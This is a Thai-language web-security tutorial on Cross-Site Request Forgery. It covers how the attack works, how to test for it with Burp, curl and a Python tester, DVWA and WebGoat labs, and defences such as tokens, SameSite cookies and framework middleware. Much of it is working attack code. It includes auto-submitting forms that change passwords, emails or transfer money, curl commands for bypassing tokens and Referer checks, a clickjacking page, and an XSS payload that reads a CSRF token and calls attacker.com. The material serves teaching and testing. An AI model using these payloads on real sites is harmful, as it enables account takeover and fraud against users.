# Part 31: CSRF - Cross-Site Request Forgery

## สารบัญ
1. [ทำความเข้าใจ CSRF](#1-ทำความเข้าใจ-csrf)
2. [CSRF Attack Scenarios](#2-csrf-attack-scenarios)
3. [การทดสอบ CSRF](#3-การทดสอบ-csrf)
4. [CSRF Token Bypass](#4-csrf-token-bypass)
5. [SameSite Cookie Bypass](#5-samesite-cookie-bypass)
6. [Advanced CSRF Techniques](#6-advanced-csrf-techniques)
7. [เครื่องมือและ Automation](#7-เครื่องมือและ-automation)
8. [แบบฝึกหัด Lab](#8-แบบฝึกหัด-lab)
9. [การป้องกัน CSRF](#9-การป้องกัน-csrf)
10. [สรุป](#10-สรุป)

---

## 1. ทำความเข้าใจ CSRF

### CSRF คืออะไร?

CSRF (Cross-Site Request Forgery) คือการโจมตีที่หลอกให้ browser ของ victim ส่ง request ไปยัง web application โดยไม่ได้รับอนุญาต

```
┌──────────────────────────────────────────────────────────────┐
│                     CSRF Attack Flow                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Victim ล็อกอิน bank.com (session cookie saved)      │
│                                                              │
│  2. Attacker ส่ง link หลอกให้ victim คลิก             │
│     (evil.com/csrf_attack.html)                              │
│                                                              │
│  3. Browser ของ victim โหลด evil.com                  │
│                                                              │
│  4. JavaScript บน evil.com ส่ง form ไป bank.com        │
│     POST /transfer?to=attacker&amount=10000                  │
│     Cookie: session=victim_session_id  (auto-attached!)      │
│                                                              │
│  5. bank.com คิดว่า victim ส่งมาเอง -> โอนเงิน    │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### เงื่อนไขการเกิด CSRF

- Browser ส่ง cookies อัตโนมัติในทุก request ไปยัง domain
- Application ใช้ cookies เพียงอย่างเดียวสำหรับ auth
- ไม่มี CSRF token หรือ validation ไม่ดีพอ

---

## 2. CSRF Attack Scenarios

### GET-based CSRF

```html
<!-- ถ้า endpoint ใช้ GET request -->
<!-- http://bank.com/transfer?to=attacker&amount=10000 -->

<!-- Attack ผ่าน image tag -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" 
     width="0" height="0">

<!-- Attack ผ่าน link -->
<a href="http://bank.com/transfer?to=attacker&amount=10000">
  คลิกเพื่อรับรางวัล
</a>

<!-- Attack ผ่าน iframe -->
<iframe src="http://bank.com/transfer?to=attacker&amount=10000" 
        style="display:none">
</iframe>

<!-- Auto-load scripts -->
<script>
  new Image().src = "http://bank.com/transfer?to=attacker&amount=10000";
</script>
```

### POST-based CSRF

```html
<!DOCTYPE html>
<!-- csrf_post_attack.html -->
<html>
<head><title>ทดสอบสะอาด</title></head>
<body>

<!-- Auto-submit form attack -->
<form id="csrf-form" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="currency" value="THB">
    <input type="submit" value="Click me">
</form>

<script>
    // Auto submit เมื่อโลดหน้า
    document.getElementById('csrf-form').submit();
</script>

</body>
</html>
```

### การ Host ไฟล์ CSRF Page

```bash
# Python HTTP server (ง่ายที่สุด)
cd /tmp
mkdir csrf_test
cd csrf_test

# สร้างไฟล์
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="http://192.168.1.100/account/change_password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
EOF

# start server
python3 -m http.server 8080
# Serving HTTP on 0.0.0.0 port 8080

# Attacker's URL: http://ATTACKER_IP:8080/index.html
```

---

## 3. การทดสอบ CSRF

### Burp Suite CSRF Scanner

```
1. ทดสอบด้วย Burp:
   a. Intercept request ของแอคชั่นที่ต้องการทดสอบ (change password, transfer, etc.)
   b. Right-click -> "Engagement tools" -> "Generate CSRF PoC"
   c. Burp Pro จะสร้าง HTML PoC ให้อัตโนมัติ

Request ที่โถไว้:
  POST /account/change-email HTTP/1.1
  Host: target.com
  Cookie: session=abc123
  Content-Type: application/x-www-form-urlencoded
  
  email=victim@test.com

Generated PoC:
  <html>
  <form action="http://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </html>
```

### ตรวจสอบด้วยตนเอง

```bash
# ============================================
# ตรวจสอบ CSRF vulnerability manually
# ============================================

# 1. Login แล้วดู request ใน Burp

# 2. ตรวจสอบ CSRF token:
#    - มี token ใน form ไหม?
#    - Token ที่ใช้เป็น unique/random ไหม?
#    - Token tied to session ไหม?

# 3. ทดสอบ ลบ csrf token ออก:
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=test@test.com"  # ไม่มี csrf token

# ถ้า success -> vulnerable!

# 4. ทดสอบ ใส่ wrong token:
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=test@test.com&csrf_token=wrong_token"

# ถ้า success -> token ไม่ถูกตรวจสอบ!

# 5. ทดสอบใส่ token จาก session อื่น:
# Login ด้วย account2 แล้ว copy csrf_token ของ account2
# ใช้ csrf_token ของ account2 กับ session ของ account1
curl -b "session=account1_session" -X POST http://target.com/change-email \
  -d "email=test@test.com&csrf_token=account2_token"

# ถ้า success -> token ไม่ tied to session!
```

### Checklist สำหรับ CSRF Testing

```
[ ] 1. เป็ด sensitive actions (change password, email, settings)
[ ] 2. ดู form - มี CSRF token ไหม?
[ ] 3. Token present -> ทดสอบ remove token
[ ] 4. Token present -> ทดสอบ invalid token
[ ] 5. Token present -> ทดสอบ token from another session
[ ] 6. ตรวจสอบ CORS policy
[ ] 7. ตรวจสอบ SameSite cookie attribute
[ ] 8. ตรวจสอบ Referer header validation
[ ] 9. สร้าง PoC และทดสอบ
```

---

## 4. CSRF Token Bypass

### Bypass 1: Remove Token Completely

```bash
# Original request:
# POST /change-email
# email=old@test.com&csrf_token=VALID_TOKEN_HERE

# Bypass: ลบตัว token ออก
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=attacker@evil.com"
# ถ้าได้ 200 OK -> vulnerable!
```

### Bypass 2: Empty Token

```bash
# ลองใส่ empty string
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=attacker@evil.com&csrf_token="

# ลองใส่ null byte
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=attacker@evil.com&csrf_token=%00"
```

### Bypass 3: Change Request Method

```bash
# ถ้า POST มี CSRF protection แต่ GET ไม่มี
curl -b "session=abc123" -G http://target.com/change-email \
  --data-urlencode "email=attacker@evil.com"

# HTML attack:
<img src="http://target.com/change-email?email=attacker@evil.com">
```

### Bypass 4: Change Content-Type

```bash
# บางแอปพลิเคชันตรวจสอบ token เฉพาะ Content-Type: application/x-www-form-urlencoded
# ถ้าเปลี่ยน Content-Type อาจ bypass ได้

# text/plain (Simple CORS request - no preflight)
curl -b "session=abc123" -X POST http://target.com/change-email \
  -H "Content-Type: text/plain" \
  -d "email=attacker@evil.com"

# application/json (if app accepts JSON)
curl -b "session=abc123" -X POST http://target.com/change-email \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# HTML PoC for JSON endpoint:
curl -b "session=abc123" -X POST http://target.com/api/change-email \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com","ignore":"'
# (body looks like JSON but content-type is plain)
```

### Bypass 5: Token Not Tied to Session

```bash
# ============================================
# Scenario: สร้าง account ของตัวเอง เอา token มาใช้
# ============================================

# 1. Attacker ล็อกอิน และได้ token ของตัวเอง:
# csrf_token=TOKEN_FROM_ATTACKER_ACCOUNT

# 2. CSRF PoC เอา token ของ attacker ไปให้ victim รัน:
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="TOKEN_FROM_ATTACKER_ACCOUNT">
</form>
<script>document.forms[0].submit();</script>
```

### Bypass 6: Referer Header Manipulation

```bash
# ถ้าแอปใช้ Referer header แทน CSRF token

# Bypass 1: ลบ Referer header ออก (บางแอปยอมรับถ้าไม่มี)
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=attacker@evil.com" \
  --referer ""

# Bypass 2: ใช้ Referrer-Policy ใน HTML
<meta name="referrer" content="no-referrer">
<form action="http://target.com/change-email" method="POST">
  ...
</form>

# Bypass 3: subdomain trick
# ถ้า app ตรวจสอบว่า Referer ขึ้นต้นด้วย target.com
# attacker.target.com/attack.html (ถ้า subdomain takeover)
# target.com.evil.com/attack.html (เช็ค substring only)
curl -b "session=abc123" -X POST http://target.com/change-email \
  -d "email=attacker@evil.com" \
  --referer "http://target.com.evil.com/"
```

---

## 5. SameSite Cookie Bypass

### SameSite Attribute Explained

```
SameSite=Strict  - Cookie ถูกส่งเฉพาะ same-site requests เท่านั้น
                   Cross-site request -> cookie ไม่ถูกส่ง
                   Strongest protection

SameSite=Lax     - Cookie ถูกส่งใน cross-site GET requests
                   (navigation, link click)
                   Cross-site POST -> cookie ไม่ถูกส่ง
                   Default ใน modern browsers

SameSite=None    - Cookie ถูกส่งใน cross-site requests
                   ต้องใช้ Secure attribute
                   ไม่มี CSRF protection
```

### Bypass SameSite=Lax

```html
<!-- เมื่อ SameSite=Lax, GET requests ยังทำงานได้ -->

<!-- Bypass 1: ใช้ GET method แทน POST -->
<a href="http://target.com/change-email?email=attacker@evil.com">
  Click me
</a>

<!-- Bypass 2: window.location -->
<script>
  window.location = "http://target.com/change-email?email=attacker@evil.com";
</script>

<!-- Bypass 3: Form with GET method -->
<form action="http://target.com/change-email" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- Bypass 4: Top-level navigation with POST (บาง browser) -->
<!-- 120 seconds แรก - new sessions might not have SameSite=Lax applied -->
```

### Bypass via Subdomain XSS

```html
<!-- ถ้า subdomain (blog.target.com) มี XSS -->
<!-- สามารถใช้ XSS เพื่อ bypass SameSite Lax/Strict ได้ -->

<!-- บน blog.target.com: XSS payload -->
<script>
// blog.target.com เป็น same-site กับ app.target.com
// ดังนั้น cookie ถูกส่ง!
fetch('http://app.target.com/change-email', {
    method: 'POST',
    credentials: 'include',  // send cookies
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'email=attacker@evil.com'
});
</script>
```

---

## 6. Advanced CSRF Techniques

### CSRF + XSS Combination

```html
<!-- เมื่อมี XSS สามารถรัน CSRF ได้โดยตรง (same-origin) -->

<!-- XSS payload ที่ steal CSRF token แล้ว submit form -->
<script>
// 1. Fetch page that contains CSRF token
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    // 2. Extract CSRF token
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const token = doc.querySelector('[name="csrf_token"]').value;
    console.log('CSRF Token:', token);
    
    // 3. Use token in malicious request
    const formData = new FormData();
    formData.append('email', 'attacker@evil.com');
    formData.append('csrf_token', token);
    
    return fetch('/account/change-email', {
      method: 'POST',
      body: formData,
      credentials: 'same-origin'
    });
  })
  .then(r => {
    if (r.ok) {
      // Exfiltrate result
      fetch('http://attacker.com/log?result=success');
    }
  });
</script>
```

### CSRF ใน JSON API

```html
<!-- JSON API CSRF - ทำได้ถ้า no CORS และ Content-Type ไม่ถูกตรวจสอบ -->

<!-- Approach 1: text/plain (bypasses CORS preflight) -->
<form action="http://api.target.com/user/update" method="POST" 
      enctype="text/plain">
  <!-- body: {"email":"attacker@evil.com","x":" -->
  <!-- url encoded: %7B%22email%22%3A%22attacker%40evil.com%22%2C%22x%22%3A+ -->
  <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<!-- Result body: {"email":"attacker@evil.com","ignore":"="}  -->
<!-- ส่วน =" ท้ายจะถูก ignore ถ้า app parse JSON ไม่เคร่งครัด -->

<!-- Approach 2: Flash + CORS bypass (older) -->
<!-- Approach 3: fetch with mode: no-cors (Simple request) -->
<script>
fetch('http://api.target.com/user/update', {
  method: 'POST',
  mode: 'no-cors',  // ไม่รับ response แต่ request ยังถูกส่ง
  credentials: 'include',  // send cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'email=attacker@evil.com'
});
</script>
```

### Clickjacking + CSRF

```html
<!-- Clickjacking เพื่อ trick user คลิก button ใน iframe -->
<!DOCTYPE html>
<html>
<head>
<style>
  #target-iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.1;  /* เกือบ invisible */
    z-index: 2;
  }
  #decoy {
    position: absolute;
    top: 200px;
    left: 400px;
    z-index: 1;
  }
</style>
</head>
<body>

<!-- Decoy content ที่ user เห็น -->
<div id="decoy">
  <h2>Win a prize! Click here!</h2>
  <button style="padding: 20px; font-size: 20px;">CLAIM NOW!</button>
</div>

<!-- Actual target (invisible) -->
<iframe id="target-iframe" 
        src="http://target.com/account/delete"
        sandbox="allow-forms allow-scripts allow-same-origin">
</iframe>

</body>
</html>
```

---

## 7. เครื่องมือและ Automation

### Python CSRF Tester

```python
#!/usr/bin/env python3
# csrf_tester.py - Automated CSRF vulnerability tester

import requests
from bs4 import BeautifulSoup
import re
import sys
from colorama import Fore, Style, init

init()

class CSRFTester:
    def __init__(self, target_url, login_url=None, credentials=None):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0)'
        })
        
        if login_url and credentials:
            self.login(login_url, credentials)
    
    def login(self, login_url, credentials):
        """Login and get session"""
        # Get login page for CSRF token
        r = self.session.get(login_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Extract CSRF token from form
        csrf_input = soup.find('input', {'name': re.compile(r'csrf|token', re.I)})
        if csrf_input:
            credentials['csrf_token'] = csrf_input.get('value', '')
        
        r = self.session.post(login_url, data=credentials)
        print(f"[*] Login status: {r.status_code}")
    
    def extract_csrf_token(self, page_url):
        """Extract CSRF token from page"""
        r = self.session.get(page_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Common CSRF token field names
        token_names = ['csrf_token', 'csrftoken', '_token', 'authenticity_token',
                      '__RequestVerificationToken', 'csrf', '_csrf']
        
        for name in token_names:
            inp = soup.find('input', {'name': name})
            if inp:
                return name, inp.get('value', '')
            
            # Check meta tag
            meta = soup.find('meta', {'name': name})
            if meta:
                return name, meta.get('content', '')
        
        return None, None
    
    def test_missing_token(self, form_url, method, data, page_url=None):
        """Test if CSRF token is required"""
        print(f"\n{Fore.CYAN}[*] Test 1: Missing CSRF token{Style.RESET_ALL}")
        
        # Remove csrf token from data
        clean_data = {k: v for k, v in data.items() 
                     if 'csrf' not in k.lower() and 'token' not in k.lower()}
        
        if method.upper() == 'POST':
            r = self.session.post(form_url, data=clean_data)
        else:
            r = self.session.get(form_url, params=clean_data)
        
        if r.status_code == 200 and 'error' not in r.text.lower():
            print(f"{Fore.RED}[VULNERABLE] Request succeeded without CSRF token!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[OK] Request rejected without CSRF token{Style.RESET_ALL}")
            return False
    
    def test_invalid_token(self, form_url, method, data, token_name):
        """Test if invalid token is accepted"""
        print(f"\n{Fore.CYAN}[*] Test 2: Invalid CSRF token{Style.RESET_ALL}")
        
        test_data = dict(data)
        test_data[token_name] = 'invalid_token_12345'
        
        if method.upper() == 'POST':
            r = self.session.post(form_url, data=test_data)
        else:
            r = self.session.get(form_url, params=test_data)
        
        if r.status_code == 200 and 'error' not in r.text.lower():
            print(f"{Fore.RED}[VULNERABLE] Invalid CSRF token accepted!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[OK] Invalid token rejected{Style.RESET_ALL}")
            return False
    
    def test_samesite_attribute(self, response=None):
        """Check SameSite attribute on session cookie"""
        print(f"\n{Fore.CYAN}[*] Test 3: SameSite Cookie Attribute{Style.RESET_ALL}")
        
        if not response:
            response = self.session.get(self.target_url)
        
        for cookie in self.session.cookies:
            samesite = getattr(cookie, 'same_site', None)
            print(f"  Cookie: {cookie.name}")
            print(f"  SameSite: {samesite if samesite else 'Not Set'}")
            
            if not samesite:
                print(f"  {Fore.YELLOW}[WARN] No SameSite attribute - potential CSRF risk{Style.RESET_ALL}")
            elif samesite.lower() == 'none':
                print(f"  {Fore.RED}[WEAK] SameSite=None - no protection{Style.RESET_ALL}")
            elif samesite.lower() == 'lax':
                print(f"  {Fore.YELLOW}[MEDIUM] SameSite=Lax - partial protection{Style.RESET_ALL}")
            elif samesite.lower() == 'strict':
                print(f"  {Fore.GREEN}[GOOD] SameSite=Strict - strong protection{Style.RESET_ALL}")
    
    def generate_poc(self, form_url, method, data):
        """Generate HTML CSRF PoC"""
        print(f"\n{Fore.CYAN}[*] Generating CSRF PoC...{Style.RESET_ALL}")
        
        # Remove token from data
        clean_data = {k: v for k, v in data.items() 
                     if 'csrf' not in k.lower() and 'token' not in k.lower()}
        
        inputs = '\n'.join([f'  <input type="hidden" name="{k}" value="{v}">' 
                           for k, v in clean_data.items()])
        
        poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf-form" action="{form_url}" method="{method}">
{inputs}
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>"""
        
        poc_file = '/tmp/csrf_poc.html'
        with open(poc_file, 'w') as f:
            f.write(poc)
        print(f"[*] PoC saved to: {poc_file}")
        print("\n" + poc)
        return poc


if __name__ == '__main__':
    # ตัวอย่างการใช้งาน
    tester = CSRFTester(
        target_url='http://dvwa.local/',
        login_url='http://dvwa.local/login.php',
        credentials={'username': 'admin', 'password': 'password'}
    )
    
    # ดึง CSRF token
    token_name, token_value = tester.extract_csrf_token('http://dvwa.local/vulnerabilities/csrf/')
    print(f"[*] CSRF Token found: {token_name} = {token_value[:20]}..." if token_value else "[*] No CSRF token found")
    
    # ข้อมูล form
    form_data = {
        'password_new': 'hacked',
        'password_conf': 'hacked',
        'Change': 'Change'
    }
    if token_value:
        form_data[token_name] = token_value
    
    # ทดสอบ
    tester.test_missing_token('http://dvwa.local/vulnerabilities/csrf/', 'GET', form_data)
    if token_name:
        tester.test_invalid_token('http://dvwa.local/vulnerabilities/csrf/', 'GET', form_data, token_name)
    tester.test_samesite_attribute()
    tester.generate_poc('http://dvwa.local/vulnerabilities/csrf/', 'GET', form_data)
```

---

## 8. แบบฝึกหัด Lab

### Lab 1: DVWA CSRF

```bash
# ============================================
# DVWA CSRF Challenge
# ============================================
# Prerequisites: DVWA running (see Part 30 setup)

# 1. เข้า http://dvwa.local/
# 2. Login: admin/password
# 3. DVWA Security -> Low
# 4. CSRF -> Change Your Admin Password

# Low Security:
# Request: GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change
# ไม่มี CSRF protection

# Create attack page:
cat > /tmp/dvwa_csrf.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Win a Free iPhone!</h1>
<img src="http://dvwa.local/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" 
     width="0" height="0">
</body>
</html>
EOF

# Host the page
cd /tmp && python3 -m http.server 8080

# เปิด http://localhost:8080/dvwa_csrf.html
# (simulate victim who is logged in to DVWA)

# ตรวจสอบว่า password เปลี่ยนแล้ว:
# Login ด้วย admin/hacked123
```

### Lab 2: WebGoat CSRF

```bash
# ติดตั้ง WebGoat
docker run -d -p 8080:8080 webgoat/webgoat-8.0
# เข้า http://localhost:8080/WebGoat/
# Register แล้วไปที่ Cross-Site Request Forgeries lesson

# WebGoat แนะนำ scenario:
# 1. Basic GET CSRF
# 2. Token bypass
# 3. JSON CSRF
```

---

## 9. การป้องกัน CSRF

### วิธีที่ 1: CSRF Token

```php
<?php
// สร้างและตรวจสอบ CSRF Token

function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validate_csrf_token($token) {
    if (!isset($_SESSION['csrf_token']) || empty($token)) {
        return false;
    }
    // ใช้ hash_equals ป้องกัน timing attacks
    return hash_equals($_SESSION['csrf_token'], $token);
}

// ใน form:
$csrf_token = generate_csrf_token();
?>
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf_token) ?>">
  <input type="password" name="new_password">
  <button type="submit">Change Password</button>
</form>

<?php
// ใน handler:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!validate_csrf_token($_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        die('Invalid CSRF token');
    }
    // Process form...
}
?>
```

### วิธีที่ 2: SameSite Cookies

```php
<?php
// Set session cookie with SameSite=Strict
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'  // หรือ 'Lax'
]);
session_start();
?>

// สำหรับ custom cookies
setcookie('session_id', $session_id, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

### วิธีที่ 3: Double Submit Cookie

```javascript
// Frontend: สร้าง CSRF token และใส่ทั้งใน cookie และ header
const csrfToken = crypto.randomUUID();

// Set cookie
document.cookie = `csrf-token=${csrfToken}; Secure; SameSite=Strict`;

// Send in header
async function makeRequest(url, method, body) {
    const response = await fetch(url, {
        method: method,
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken  // custom header
        },
        credentials: 'include',
        body: JSON.stringify(body)
    });
    return response;
}

// Backend: ตรวจสอบว่า header token ตรงกับ cookie token
```

```python
# Django มี CSRF protection built-in
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # ต้องมี!
    ...
]

# Template
# {% csrf_token %}

# Flask-WTF
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# Express.js (csurf middleware)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
```

### วิธีที่ 4: Custom Headers สำหรับ APIs

```javascript
// ถ้า API ต้องการ X-Requested-With header
// Browser ไม่ส่ง custom header ใน cross-site request โดย default
fetch('/api/change-email', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',  // Ajax request indicator
        'Content-Type': 'application/json'
    },
    credentials: 'include',
    body: JSON.stringify({ email: 'new@email.com' })
});

// Backend ตรวจสอบ:
if (request.headers.get('X-Requested-With') !== 'XMLHttpRequest') {
    return Response(status=403)
}
```

---

## 10. สรุป

### Summary Table

| หัวข้อ | เนื้อหา |
|--------|--------|
| ความเสี่ยง | Browser auto-sends cookies ใน cross-site requests |
| GET CSRF | Image, link, iframe, script src |
| POST CSRF | Auto-submit form, fetch with no-cors |
| Token Bypass | Remove, empty, invalid, cross-session, method change |
| SameSite Bypass | GET requests, subdomain XSS |
| CSRF+XSS | Read token via XSS, then use in request |
| การป้องกัน | CSRF tokens, SameSite=Strict, custom headers |

### Checklist

```
[ ] หา state-changing requests ทั้งหมด
[ ] ตรวจสอบ CSRF token ในทุก form/AJAX
[ ] ทดสอบลบ token
[ ] ทดสอบ invalid token
[ ] ทดสอบ cross-session token
[ ] ตรวจสอบ SameSite cookie attribute
[ ] ตรวจสอบ CORS policy
[ ] สร้างและทดสอบ PoC
[ ] Document findings
```

### Quick Reference

```html
<!-- GET CSRF via image -->
<img src="http://target.com/action?param=evil" width=0 height=0>

<!-- POST CSRF auto-submit -->
<form id="f" action="http://target.com/action" method="POST">
  <input type="hidden" name="param" value="evil">
</form>
<script>f.submit();</script>

<!-- CSRF PoC with fetch -->
<script>
fetch('http://target.com/action', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  body: 'param=evil'
});
</script>
```

---

**ต่อไป**: [Part 32 - SSRF Server-Side Request Forgery](Part-32-SSRF-Server-Side-Request-Forgery.md)
